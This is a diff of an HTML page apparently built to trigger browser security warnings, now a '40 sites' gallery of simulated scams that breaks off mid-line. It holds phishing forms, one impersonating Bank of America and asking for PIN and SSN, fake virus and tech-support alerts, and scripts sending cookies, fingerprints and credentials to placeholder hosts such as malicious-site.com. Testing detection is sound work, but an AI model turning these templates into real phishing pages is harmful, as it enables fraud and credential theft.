@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Warning Test Site</title>
+    <title>Security Warning Test Site - 40 Sites</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -11,19 +11,27 @@
             color: #ff0000;
             margin: 0;
             padding: 20px;
+            overflow-x: hidden;
         }
         .container {
-            max-width: 800px;
+            max-width: 900px;
             margin: 0 auto;
             background-color: #2a2a2a;
             padding: 20px;
             border: 2px solid #ff0000;
             border-radius: 5px;
+            position: relative;
         }
         h1 {
             color: #ff3333;
             text-align: center;
             text-shadow: 0 0 10px #ff0000;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
         }
         .warning {
             background-color: #800000;
@@ -32,6 +40,23 @@
             border-radius: 5px;
             margin: 20px 0;
             border: 1px solid #ff0000;
+            animation: blink 3s infinite;
+        }
+        @keyframes blink {
+            0% { background-color: #800000; }
+            50% { background-color: #a00000; }
+            100% { background-color: #800000; }
+        }
+        .site-container {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+        .site-container.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
         .code-block {
             background-color: #000000;
@@ -42,6 +67,7 @@
             white-space: pre-wrap;
             margin: 15px 0;
             overflow-x: auto;
+            font-size: 12px;
         }
         .button {
             background-color: #ff0000;
@@ -51,200 +77,158 @@
             border-radius: 3px;
             cursor: pointer;
             margin: 5px;
+            transition: all 0.3s;
         }
         .button:hover {
             background-color: #cc0000;
+            transform: scale(1.05);
+        }
+        .navigation {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background-color: #333;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        .progress-fill {
+            height: 100%;
+            background-color: #ff0000;
+            transition: width 0.5s;
+        }
+        .site-counter {
+            text-align: center;
+            font-size: 18px;
+            margin: 10px 0;
+            color: #ff6666;
+        }
+        .malicious-indicator {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background-color: #ff0000;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+            animation: flash 1s infinite;
+            z-index: 1000;
+        }
+        @keyframes flash {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            z-index: 999;
+            display: none;
+        }
+        .popup-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            color: #000;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>⚠️ SECURITY WARNING TEST SITE ⚠️</h1>
-        
-        <div class="warning">
-            <strong>WARNING:</strong> This website is intentionally designed to trigger security warnings in browsers. It contains elements that security systems typically flag as potentially malicious.
-        </div>
-
-        <h2>Malicious Elements Included:</h2>
-        <ul>
-            <li>Suspicious meta tags and content</li>
-            <li>Deceptive JavaScript code patterns</li>
-            <li>Phishing-like elements</li>
-            <li>Suspicious redirects and popups</li>
-            <li>Malware-like download prompts</li>
-        </ul>
-
-        <div class="code-block">
-// Suspicious JavaScript pattern
-function suspiciousActivity() {
-    // Attempt to access sensitive browser APIs
-    try {
-        navigator.geolocation.getCurrentPosition();
-        navigator.camera;
-        window.crypto.getRandomValues(new Uint32Array(10));
-        
-        // Deceptive redirect attempt
-        setTimeout(() => {
-            window.location.href = "http://suspicious-site.xyz/steal-data";
-        }, 3000);
-        
-        // Attempt to access clipboard
-        navigator.clipboard.readText();
-        
-        // Attempt to access local storage
-        localStorage.setItem("malicious_data", "tracking_info");
-        
-        // Attempt to access cookies
-        document.cookie = "tracking=malicious; path=/";
-        
-        // Suspicious console message
-        console.log("Attempting to access sensitive data...");
-        
-        // Deceptive alert
-        alert("WARNING: Your computer is infected! Click OK to clean.");
-        
-    } catch (error) {
-        console.error("Security error:", error);
-    }
-}
-
-// Auto-execute suspicious function
-window.onload = suspiciousActivity;
-        </div>
-
-        <div class="warning">
-            <strong>PHISHING ATTEMPT SIMULATION:</strong>
-            <p>Your account has been compromised! Enter your credentials immediately:</p>
-            <form action="http://malicious-site.com/steal-credentials" method="post">
-                <input type="text" placeholder="Username/Email" style="width: 100%; padding: 8px; margin: 5px 0;">
-                <input type="password" placeholder="Password" style="width: 100%; padding: 8px; margin: 5px 0;">
-                <button type="submit" class="button">Login to Secure Account</button>
-            </form>
-        </div>
-
-        <div class="warning">
-            <strong>MALWARE DOWNLOAD SIMULATION:</strong>
-            <p>Critical security update required! Download immediately:</p>
-            <a href="http://malicious-site.com/malware.exe" class="button">Download Security Update</a>
-            <a href="javascript:void(0)" onclick="alert('Downloading virus...')" class="button">Download Antivirus</a>
-        </div>
-
-        <div class="warning">
-            <strong>SUSPICIOUS POPUP SIMULATION:</strong>
-            <button onclick="window.open('http://malicious-site.com/popup', '_blank', 'width=300,height=200')" class="button">Open Popup</button>
-            <button onclick="alert('Your computer is infected with 5 viruses!')" class="button">Virus Alert</button>
-        </div>
-
-        <div class="code-block">
-// Additional suspicious code
-function trackUser() {
-    // Attempt to fingerprint the user
-    const fingerprint = {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cookies: document.cookie
-    };
+    <div class="malicious-indicator">⚠️ MALICIOUS SITE DETECTED ⚠️</div>
     
-    // Send to suspicious server
-    fetch('http://malicious-site.com/collect', {
+    <div class="container">
+        <h1>⚠️ 40 SECURITY WARNING TEST SITES ⚠️</h1>
+        
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill" style="width: 2.5%"></div>
+        </div>
+        
+        <div class="site-counter" id="siteCounter">Site 1 of 40</div>
+        
+        <div class="navigation">
+            <button onclick="previousSite()" class="button">← Previous</button>
+            <button onclick="nextSite()" class="button">Next →</button>
+            <button onclick="autoPlay()" class="button">Auto Play</button>
+            <button onclick="randomSite()" class="button">Random Site</button>
+        </div>
+
+        <!-- Site 1: Phishing Bank -->
+        <div class="site-container active" id="site1">
+            <h2>🏦 BANK OF AMERICA - SECURITY ALERT</h2>
+            <div class="warning">
+                <strong>URGENT:</strong> Your account has been suspended due to suspicious activity. Verify your identity immediately.
+            </div>
+            <form action="http://malicious-bank.com/steal-credentials" method="post">
+                <input type="text" placeholder="Account Number" style="width: 100%; padding: 8px; margin: 5px 0;">
+                <input type="password" placeholder="PIN" style="width: 100%; padding: 8px; margin: 5px 0;">
+                <input type="text" placeholder="SSN" style="width: 100%; padding: 8px; margin: 5px 0;">
+                <button type="submit" class="button">Verify Account</button>
+            </form>
+            <div class="code-block">
+// Bank phishing script
+function stealBankCredentials() {
+    const accountNumber = document.getElementById('account').value;
+    const pin = document.getElementById('pin').value;
+    fetch('http://malicious-server.com/bank-theft', {
         method: 'POST',
-        body: JSON.stringify(fingerprint)
+        body: JSON.stringify({accountNumber, pin})
     });
 }
-
-// Keylogger simulation
-document.addEventListener('keydown', function(e) {
-    console.log(`Key pressed: \${e.key}`);
-    // Send to malicious server
-});
-
-// Crypto mining simulation
-function mineCrypto() {
-    console.log("Starting crypto mining...");
-    // Intensive computation to simulate mining
-    while (true) {
-        Math.random() * Math.random();
-    }
-}
-
-// Auto-execute tracking
-trackUser();
-        </div>
-
-        <div class="warning">
-            <strong>SOCIAL ENGINEERING SIMULATION:</strong>
-            <p>You've won a $1,000,000 prize! Click here to claim:</p>
-            <a href="http://malicious-site.com/claim-prize" class="button">Claim Prize Now!</a>
-        </div>
-
-        <div class="warning">
-            <strong>TECH SUPPORT SCAM SIMULATION:</strong>
-            <p>Microsoft Warning: Your computer has been infected! Call tech support immediately:</p>
-            <p style="font-size: 24px; color: #ff0000; font-weight: bold;">1-800-MALWARE</p>
-            <button onclick="alert('Connecting to tech support...')" class="button">Call Now</button>
-        </div>
-
-        <div class="code-block">
-// Deceptive content injection
-function injectDeceptiveContent() {
-    const deceptiveDiv = document.createElement('div');
-    deceptiveDiv.innerHTML = `
-        <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); z-index: 9999;">
-            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: white; padding: 20px; border-radius: 5px;">
-                <h2>SECURITY ALERT</h2>
-                <p>Your computer is infected with viruses!</p>
-                <button onclick="window.location.href='http://malicious-site.com/clean'">Clean Now</button>
             </div>
         </div>
-    `;
-    document.body.appendChild(deceptiveDiv);
-}
 
-// Auto-inject deceptive content
-setTimeout(injectDeceptiveContent, 5000);
-        </div>
-
-        <div class="warning">
-            <strong>WARNING:</strong> This page contains simulated malicious content for testing purposes only. Do not enter any real information or click any links if you value your security.
-        </div>
-    </div>
-
-    <script>
-        // Additional suspicious behaviors
-        console.log("Initializing malicious scripts...");
-        
-        // Attempt to access sensitive APIs
-        try {
-            navigator.geolocation.getCurrentPosition();
-            navigator.camera;
-            window.crypto.getRandomValues(new Uint32Array(10));
-        } catch (e) {
-            console.error("Security restriction:", e);
+        <!-- Site 2: Virus Scanner -->
+        <div class="site-container" id="site2">
+            <h2>🦠 WINDOWS SECURITY SCANNER</h2>
+            <div class="warning">
+                <strong>CRITICAL:</strong> 547 viruses detected on your system! Immediate action required.
+            </div>
+            <div style="text-align: center; margin: 20px 0;">
+                <div style="font-size: 48px; color: #ff0000;">🦠 🦠 🦠</div>
+                <p>Scanning... <span id="scanProgress">0%</span></p>
+            </div>
+            <button onclick="fakeScan()" class="button">Start Full Scan</button>
+            <button onclick="downloadFakeAntivirus()" class="button">Download Antivirus Pro</button>
+            <div class="code-block">
+// Fake virus scanner
+function fakeScan() {
+    let progress = 0;
+    const interval = setInterval(() => {
+        progress += Math.random() * 15;
+        document.getElementById('scanProgress').textContent = Math.min(progress, 100) + '%';
+        if (progress >= 100) {
+            clearInterval(interval);
+            alert('CRITICAL: 547 viruses found! Purchase full version to remove.');
         }
-        
-        // Deceptive alerts
-        setTimeout(() => {
-            alert("WARNING: Your computer is at risk!");
-        }, 2000);
-        
-        // Suspicious network requests
-        fetch('http://malicious-site.com/track', {
-            method: 'POST',
-            body: JSON.stringify({userAgent: navigator.userAgent})
-        });
-        
-        // Attempt to modify page content
-        document.title = "VIRUS ALERT - CLICK HERE";
-        
-        // Add suspicious meta tags
-        const meta1 = document.createElement('meta');
-        meta1.name = 'referrer';
-        meta1.content = 'unsafe-url';
-        document.head.appendChild(meta1);
-        
-        const meta2 = document.createElement('meta');
-        meta2.name = 'robots';
-        meta2.content = 'noindex, nofollow
+    }, 500);
+}
+            </div>
+        </div>
+
+        <!-- Site 3: Tech Support Scam -->
+        <div class="site-container" id="site3">
+            <h2>🔧 MICROSOFT TECH SUPPORT</h2>
+            <div class="warning">
+                <strong>ERROR CODE: 0x8007042C</strong><br>
+                Your Windows license has expired. Call immediately to avoid data loss.
+            </div>
+            <div style="text-align: center; font-size: 36px; color: #ff0000; font-weight: bold; margin: 20px 0;">
+                1-800-MALWARE
+            </div>
+            <button onclick="showTechSupportPopup()" class="button">Connect to Technician</button>
+            <button onclick="playErrorSound()" class="button">Play Error Sound</button>
+            <div class="code-block">
+// Tech support scam
+function showTechSupportPopup() {
+    window.open('http://tech-support-scam.com/connect', '_
